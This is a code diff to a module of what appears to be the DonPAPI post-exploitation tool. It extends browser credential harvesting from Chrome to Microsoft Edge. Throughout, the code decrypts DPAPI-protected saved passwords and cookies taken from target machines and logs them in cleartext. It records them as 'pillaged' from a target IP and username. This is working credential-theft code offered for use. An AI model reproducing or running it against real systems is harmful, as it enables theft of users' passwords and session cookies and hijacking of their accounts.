@@ -5,7 +5,7 @@ from donpapi.lib.toolbox import bcolors
 from donpapi.lib.dpapi import *
 
 class CHROME_LOGINS:
-	def __init__(self, options,logger,db,username):
+	def __init__(self, options,logger,db,username,type ="Chrome"):
 		self.logindata_path = None
 		self.localstate_path = None
 		self.localstate_dpapi = None
@@ -21,6 +21,7 @@ class CHROME_LOGINS:
 		self.cookies = {}
 		self.db=db
 		self.version=''
+		self.type= type
 
 	def get_masterkey_guid_from_localstate(self):
 		try:
@@ -28,12 +29,10 @@ class CHROME_LOGINS:
 				if os.path.isfile(self.localstate_path):
 					with open(self.localstate_path, "rb") as f:
 						localfile_datas = json.load(f)
-						#print(localfile_datas)
 						key_blob = localfile_datas['os_crypt']['encrypted_key']
 						blob = base64.b64decode(key_blob)
-						#print(blob)
 						if blob[:5] == b'DPAPI':
-							self.logging.debug(f"[{self.options.target_ip}] [Chrome decoding] found DPAPI blob : {binascii.hexlify(blob[5:])}")
+							self.logging.debug(f"[{self.options.target_ip}] [{self.type} decoding] found DPAPI blob : {binascii.hexlify(blob[5:])}")
 							blob = blob[5:]
 							self.localstate_dpapi=DPAPI(self.options,self.logging)
 							#mydpapi = DPAPI(myoptions, self.logging)
@@ -43,11 +42,11 @@ class CHROME_LOGINS:
 								self.masterkey_guid=guid
 								return self.masterkey_guid
 						else:
-							self.logging.debug(	f"[{self.options.target_ip}] {bcolors.WARNING}Erro getting en DPAPI Blob from Chrome localstate file{bcolors.ENDC}")
+							self.logging.debug(	f"[{self.options.target_ip}] {bcolors.WARNING}Erro getting en DPAPI Blob from {self.type} localstate file{bcolors.ENDC}")
 							return None
 		except Exception as ex:
 			self.logging.debug(
-				f"[{self.options.target_ip}] {bcolors.WARNING}Exception Getting Blob for Chrome{bcolors.ENDC}")
+				f"[{self.options.target_ip}] {bcolors.WARNING}Exception Getting Blob for {self.type}{bcolors.ENDC}")
 			self.logging.debug(ex)
 			return None
 
@@ -92,17 +91,17 @@ class CHROME_LOGINS:
 				decrypted_pass = cipher.decrypt(payload)[:-16]#Removing bloc of padded data
 				decrypted_pass = decrypted_pass.decode('utf-8')
 				if decrypted_pass != None:
-					self.logging.debug(f"[{self.options.target_ip}] Decrypted Chrome password : {decrypted_pass}")
+					self.logging.debug(f"[{self.options.target_ip}] Decrypted {self.type} password : {decrypted_pass}")
 					return decrypted_pass
 				else:
-					self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Error in decrypt Chrome password {bcolors.ENDC}")
+					self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Error in decrypt {self.type} password {bcolors.ENDC}")
 					return None
 			else :
-				self.logging.debug(f"[{self.options.target_ip}] Got a Chrome Version : {enc_password[:3]} NOT IMPLEMENTED")
+				self.logging.debug(f"[{self.options.target_ip}] Got a {self.type} Version : {enc_password[:3]} NOT IMPLEMENTED")
 				#c'est du DPAPI ?
 			#Win32CryptUnprotectData(password, is_current_user=constant.is_current_user, user_dpapi=constant.user_dpapi)  user_dpapi=constant.user_dpapi)
 		except Exception as ex:
-			self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypt_AES_chrome_password Chrome{bcolors.ENDC}")
+			self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypt_AES_chrome_password {self.type}{bcolors.ENDC}")
 			self.logging.debug(ex)
 			return None
 
@@ -111,7 +110,7 @@ class CHROME_LOGINS:
 	def decrypt_chrome_LoginData(self):
 		#path = '192.168.20.141\\Users\\Administrateur.TOUF\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
 		try:
-			self.logging.debug(	f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [Chrome Decrypt LoginData] {bcolors.ENDC} started for {self.logindata_path}")
+			self.logging.debug(	f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [{self.type} Decrypt LoginData] {bcolors.ENDC} started for {self.logindata_path}")
 			if self.logindata_path!=None:
 				if os.path.isfile(self.logindata_path):
 					connection = sqlite3.connect(self.logindata_path)
@@ -121,7 +120,7 @@ class CHROME_LOGINS:
 							'SELECT action_url, username_value, password_value FROM logins')
 						value = v.fetchall()
 					self.logging.debug(
-						f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [Chrome Decrypt LoginData] {bcolors.ENDC} got {len(value)} entries")
+						f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [{self.type} Decrypt LoginData] {bcolors.ENDC} got {len(value)} entries")
 					for origin_url, username, password in value:
 						#self.logging.debug(f"[+] Found Chrome data for user {username} : {origin_url} ")
 						self.logins[origin_url]={}
@@ -136,11 +135,11 @@ class CHROME_LOGINS:
 						                  credz_path='',
 						                  pillaged_from_computer_ip=self.options.target_ip,
 						                  pillaged_from_username=self.username)
-						self.logging.info(	f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [Chrome Password] {bcolors.ENDC} for {origin_url} [ {bcolors.OKBLUE}{self.logins[origin_url]['username']} : {self.logins[origin_url]['password']}{bcolors.ENDC} ]")
+						self.logging.info(	f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [{self.type} Password] {bcolors.ENDC} for {origin_url} [ {bcolors.OKBLUE}{self.logins[origin_url]['username']} : {self.logins[origin_url]['password']}{bcolors.ENDC} ]")
 		except sqlite3.OperationalError as e:
 			e = str(e)
 			if (e == 'database is locked'):
-				print('[!] Make sure Google Chrome is not running in the background')
+				print('[!] Make sure Google Chrome / MS Edge is not running in the background')
 			elif (e == 'no such table: logins'):
 				print('[!] Something wrong with the database name')
 			elif (e == 'unable to open database file'):
@@ -155,7 +154,7 @@ class CHROME_LOGINS:
 		#path = '192.168.20.141\\Users\\Administrateur.TOUF\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
 		try:
 			if self.cookie_path!=None:
-				self.logging.debug(f"[{self.options.target_ip}] [+] Decrypting Chrome cookie in {self.cookie_path}")
+				self.logging.debug(f"[{self.options.target_ip}] [+] Decrypting {self.type} cookie in {self.cookie_path}")
 				if os.path.isfile(self.cookie_path):
 					connection = sqlite3.connect(self.cookie_path)
 					with connection:
@@ -164,9 +163,9 @@ class CHROME_LOGINS:
 							'select host_key, "TRUE", path, "FALSE", expires_utc, name, encrypted_value from cookies')
 						values = v.fetchall()
 
-					self.logging.debug(f"[{self.options.target_ip}] [+] Found {len(values)} Chrome cookies")
+					self.logging.debug(f"[{self.options.target_ip}] [+] Found {len(values)} {self.type} cookies")
 					for host_key, _, path, _, expires_utc, name, encrypted_value in values:
-						self.logging.debug(f"[{self.options.target_ip}] [+] Found Chrome cookie for {host_key}, cookie name: {name}, expire at utc :{(datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).strftime('%b %d %Y %H:%M:%S')}")
+						self.logging.debug(f"[{self.options.target_ip}] [+] Found {self.type} cookie for {host_key}, cookie name: {name}, expire at utc :{(datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).strftime('%b %d %Y %H:%M:%S')}")
 						self.cookies[host_key]={}
 						self.cookies[host_key][name]=self.decrypt_chrome_password(encrypted_value)
 						############PROCESSING DATA
@@ -178,12 +177,12 @@ class CHROME_LOGINS:
 						                  credz_path='',
 						                  pillaged_from_computer_ip=self.options.target_ip,
 						                  pillaged_from_username=self.username)
-						self.logging.info(f"[{self.options.target_ip}] [+]  {bcolors.OKGREEN}[Chrome Cookie] {bcolors.ENDC} for {host_key} {bcolors.OKBLUE}[ {name}:{self.cookies[host_key][name]} ] {bcolors.ENDC} expire time: {(datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).strftime('%b %d %Y %H:%M:%S')}")
+						self.logging.info(f"[{self.options.target_ip}] [+]  {bcolors.OKGREEN}[{self.type} Cookie] {bcolors.ENDC} for {host_key} {bcolors.OKBLUE}[ {name}:{self.cookies[host_key][name]} ] {bcolors.ENDC} expire time: {(datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).strftime('%b %d %Y %H:%M:%S')}")
 
 		except sqlite3.OperationalError as e:
 			e = str(e)
 			if (e == 'database is locked'):
-				self.logging.debug(f"[{self.options.target_ip}] [!] Make sure Google Chrome is not running in the background")
+				self.logging.debug(f"[{self.options.target_ip}] [!] Make sure Google {self.type} is not running in the background")
 			elif (e == 'no such table: logins'):
 				self.logging.debug(f"[{self.options.target_ip}] [!] Something wrong with the database name")
 			elif (e == 'unable to open database file'):
@@ -197,7 +196,7 @@ class CHROME_LOGINS:
 	def get_chrome_Version(self):
 		try:
 			if self.version_path!=None:
-				self.logging.debug(f"[{self.options.target_ip}] [+] Getting Chrome version in {self.version_path}")
+				self.logging.debug(f"[{self.options.target_ip}] [+] Getting {self.type} version in {self.version_path}")
 
 				if os.path.isfile(self.version_path):
 					f=open(self.version_path,'rb')
@@ -207,11 +206,11 @@ class CHROME_LOGINS:
 						                  version=self.version,
 						                  pillaged_from_computer_ip=self.options.target_ip,
 						                  pillaged_from_username=self.username)
-					self.logging.info(f"[{self.options.target_ip}] [+]  {bcolors.OKGREEN}[Chrome Version] {bcolors.ENDC}  {bcolors.OKBLUE}{self.version} {bcolors.ENDC}")
+					self.logging.info(f"[{self.options.target_ip}] [+]  {bcolors.OKGREEN}[{self.type} Version] {bcolors.ENDC}  {bcolors.OKBLUE}{self.version} {bcolors.ENDC}")
 
 		except Exception as ex:
 			self.logging.debug(
-				f"[{self.options.target_ip}] {bcolors.WARNING}Exception Getting Blob for Chrome{bcolors.ENDC}")
+				f"[{self.options.target_ip}] {bcolors.WARNING}Exception Getting Blob for {self.type}{bcolors.ENDC}")
 			self.logging.debug(ex)
 
 		return self.version
